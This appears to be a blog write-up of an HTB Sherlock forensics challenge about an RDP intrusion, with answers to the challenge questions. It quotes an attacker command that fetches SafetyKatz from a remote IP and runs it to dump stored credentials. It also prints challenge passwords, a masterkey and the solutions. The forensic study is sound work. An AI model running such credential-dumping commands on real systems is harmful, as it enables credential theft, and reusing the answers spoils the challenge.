---
title: HTB-ArcadiasCompromise
date: 2026-10-18 19:55:00 +0700
categories: [HTB]
tags: [forensic, dfir, windows, rdp, eventlog, prefetch, mftecmd, srum, dpapi, mimikatz, impacket, hashcat, bmc-tools, sherlock] # TAG names should always be lowercase
media_subpath: /assets/img/2026-10-18-HTB_ArcadiasCompromise/
toc: true
comments: false
---

# Arcadia's Compromise

![image.png](image.png)

### 1. As part of an enforced configuration change, the administrator changed the default RDP port. What port number was bound to the RDP service?
ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp
![image 1.png](image%201.png)
-> Answer : 17290

### 2. What is the name of the Windows Firewall rule that allowed external access to this RDP service?
ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules
![image 2.png](image%202.png)
-> Answer : RDP_Rock$

### 3. What is the external IP address of the attacker who attempted to access the system via RDP?
Kiểm tra event log ID: 4625 ta phát hiện thấy IP: 34.175.199.240 cố gắng truy cập vào máy SH4D0W
![image 3.png](image%203.png)
->Answer : 34.175.199.240

### 4. What is the name of the workstation from which the attack originated?
Như đã đề cập ở trên 
-> Answer : SH4D0W

### 5. How many failed RDP authentication attempts were recorded before the attacker successfully logged in?
![image 4.png](image%204.png)
-> Answer : 87

### 6. When did the attacker successfully authenticate to the system via RDP?
Event ID : 1149 - RDP network connection established
![image 5.png](image%205.png)
-> Answer : 2026-01-10 15:54:21

### 7. The Attacker dropped a file and ran it on the system after gaining access. What is the full path of the file?
Ở đây mình sử dụng MFTECmd để parse $J ra CSV sau đó xem bằng Timelineexplorer
![image 6.png](image%206.png)
-> Answer : C:\Users\schem\AppData\Local\Temp\Loader.exe

### 8. When was the malicious file executed for the first time?
Sử dụng PECmd để đọc file `LOADER.EXE-43099C31.pf` từ prefetch
![image 7.png](image%207.png)
-> Answer : 2026-01-10 15:59:36

### 9. What is the full command used to dump stored credentials while evading in-memory protections on the endpoint?
Lịch sử powershell tại C:\Users\schem\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
![image 8.png](image%208.png)
ở đây attacker dùng Loader.exe load SafteyKatz.exe (nhìn lệnh trông giống với mimikatz ) để dump credential, sau đó tạo user mới là IT_Support với quyền Administrator
-> Answer : `cmd /c .\Loader.exe -path http://34.175.199.240:7777/SafetyKatz.exe "vault::cred /patch" exit`

### 10. How many network resources, in Kilobytes, were consumed when receiving the remote credential dumping command for credential dumping while evading defenses in memory from the attacker's server?
Để xem network resources được tiêu thụ ta xem trong SRUDB.dat 
![image 9.png](image%209.png)
![image 10.png](image%2010.png)
![image 11.png](image%2011.png)
nhưng tới đây mình vẫn chưa tìm ra được đáp án đúng

### 11. What is the MITRE sub-technique ID of the action the attacker took in the previous question?
Như đã biết attacker lấy credential bằng cách dump Windows Vault ở trên. Sau khi kiểm tra thì mình xác định được 
![image 12.png](image%2012.png)
-> Answer : T1555.004

### 12. For compliance and legal purposes, we need to identify the password in use at the time of the incident. What is the password of the compromised user account?
Theo event log ta biết được Attacker đã RDP vào máy nội bộ với user `SchematicsAdmin`, ở đây mình dùng secretsdump từ bộ Impacket để dump NThash của user, sau đó dùng hascat với mode 1000 (NTLM) để tìm password từ wordlist rockyou
![image 13.png](image%2013.png)

![image 14.png](image%2014.png)
-> Answer : arcadesarefun1

### 13. The compromised server acted as a central command center for Arcadia's network. Please list the credentials that the attacker stole from a privileged account, so the impact of data theft may be minimized.

mình đã thử các credential trích xuất password hash của tài khoản Windows local từ Registry nhưng đều không phải, nên mình nghĩ có thể nó sẽ nằm ở trong Vault `C:\Users\schem\AppData\Local\Microsoft\Credentials`, vì các file trong này được bảo vệ bằng DPAPI, nên mình cần masterkey để giải mã chúng, để giải mã masterkey của user thì chúng ta phải có : 
- Masterkey file 
- SID của user
- Password của user 
và masterkey file sẽ nằm tại C:\Users\<user>\AppData\Roaming\Microsoft\Protect\{SID}\

![image 15.png](image%2015.png)
-> masterkey : 0x05e0411294282ec82794a71737d7ba58704838a62e011363a5393e4555643b14fe7b39a7946a4a00a4343a6deaf472a69f646f8e47ab85314fad290ced530293
Tiếp đến đi giải mã credential với masterkey tìm được bằng dpapi.py của Impacket
![image 16.png](image%2016.png)
-> Answer : LogisticsManager:Wohooo_TrY_4nD_Gu3Ss_1T!

### 14. When did the attacker set up the backdoor account for persistence?
Ở phía trên chúng ta đã biết attacker tạo backdoor account với username IT_Support , để kiểm tra thời gian chúng ta cần kiểm tra event log ID 4720 (A new account was created)
![image 17.png](image%2017.png)
-> Answer : 2026-01-10 16:03:27

### 15. When was the compromised workstation seen connecting to another system in the network and starting a session?
Event ID : 1024 (RDP Client is trying to connect to the server)
![image 18.png](image%2018.png)
-> Answer : 2026-01-10 16:04:35

### 16. What is the hostname of the second compromised system?
Từ câu trên ta biết được 
-> Answer : ARCADIA-WS02

### 17. What are the contents found on notepad by the attacker upon accessing the second system?
Vì chúng ta chỉ có artifact là the first system nên để biết được nội dung của notepad trên second system cách duy nhất là xem từ RDP bitmap cache tại `C/Users/schem/AppData/Local/Microsoft/Terminal Server Client/Cache` bằng bmc-tools
![image 19.png](image%2019.png)
![image 20.png](image%2020.png)
### 18. How long did the attacker's RDP session remain active on the first compromised system in seconds?
Trên first compromised system Attacker's RDP session bắt đầu lúc `2026-01-10 15:54:25`
![image 21.png](image%2021.png)
kết thúc lúc `2026-01-10 16:05:37`
![image 22.png](image%2022.png)
-> thời gian hoạt động : 672s
-> Answer : 672